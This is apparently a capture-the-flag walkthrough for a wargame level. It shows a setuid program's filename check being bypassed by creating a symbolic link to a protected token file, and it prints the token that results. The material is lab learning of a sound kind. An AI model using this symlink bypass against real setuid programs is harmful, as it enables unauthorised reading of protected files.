L-> -rwsr-s---+ 1 flag08 [...] level08
L-> -rw-------  1 flag08 [...] token

ok so a new executable as flag08 and a token file wich we can't read inside ofc
lets try the executable

./level08
|
L-> ./level08 [file to read]

ok so you need an arg

./level08 token
|
L->  You mau not access 'token'

hmm ok, let's see why we got this

strings level08
|
L-> [...]
L-> %s [file to read]
L-> token
L-> You may not access '%s'


ok so it seems like we can't use any file containing token in the name
let's verify this

touch /tmp/token

./level08 /tmp/token
|
L->  You mau not access 'token'

ok it's this, but we can't use mv to edit the name of this file, but we can create a symbolic link with it

ln -s ~/token /tmp/nekot

./level08 /tmp/nekot
|
L-> quif5eloekouj29ke0vouxean


but we can't connect to level09 with this, we need to execute getflag as flag08
